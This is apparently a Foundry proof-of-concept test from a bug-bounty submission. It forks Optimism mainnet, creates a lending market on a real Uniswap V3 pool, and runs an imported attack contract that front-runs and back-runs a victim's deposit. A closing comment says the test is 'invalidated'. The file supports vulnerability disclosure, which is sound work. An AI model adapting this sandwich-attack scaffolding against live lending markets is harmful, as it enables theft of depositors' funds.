// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/src/PoC.sol";
import {IUniswapV3Pool} from "v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import "../src/FrontrunContract.sol";
import "../src/external/Factory/src/Lender.sol";
import "../src/external/Factory/src/RateModel.sol";
import "../src/external/Factory/src/Factory.sol";

contract PoCTest is PoC {
    uint256 victimDeposit;
    address victim;
    IERC20[] tokens;

    FrontrunContract public attackContract;
    Lender public lender;
    Factory public factory;
    IUniswapV3Pool pool;

    function setUp() public {
        // Fork from specified block chain at block
        vm.createSelectFork("https://rpc.ankr.com/optimism"); // , block_number);

        // Factory contract, used to create a new market
        factory = Factory(0x95110C9806833d3D3C250112fac73c5A6f631E80);

        // Market is created with an example pool, WETH-KROM
        // Must be a new market, i.e. there cannot be existing markets with this pool

        pool = IUniswapV3Pool(0xE62bd99a9501ca33D98913105Fc2BeC5BAE6e5dD);
        factory.createMarket(pool);

        // Both lending markets work for the sake of this PoC, first one is arbitrarily chosen.
        // This coincides with pool.token0, in this case WETH 
        (lender,,) = factory.getMarket(pool);
        tokens.push(IERC20(address(lender.asset())));

        // Deploy attack contract
        attackContract = new FrontrunContract(lender, tokens[0]);

        victimDeposit = 1e18;
        setAlias(address(attackContract), "Attacker");
        victim = makeAddr("victim");
        deal(address(tokens[0]), address(attackContract), victimDeposit);
        deal(address(tokens[0]), victim, victimDeposit);

        console.log("\n>>> Initial conditions");
    }

    function testAttack() public snapshot(address(attackContract), tokens) {
        // Top bun
        attackContract.frontRun(victimDeposit);

        // Victim transaction
        vm.prank(victim);
        tokens[0].transfer(address(lender), victimDeposit);

        vm.prank(victim);
        uint victimShares = lender.deposit(victimDeposit, victim);
        console.log(victimShares);

        // Bottom bun
        attackContract.backRun();

        // test invalidated. o7
        vm.prank(victim);
        lender.redeem(victimShares, victim, victim);
        assertEq(tokens[0].balanceOf(victim), victimDeposit);
    }
}
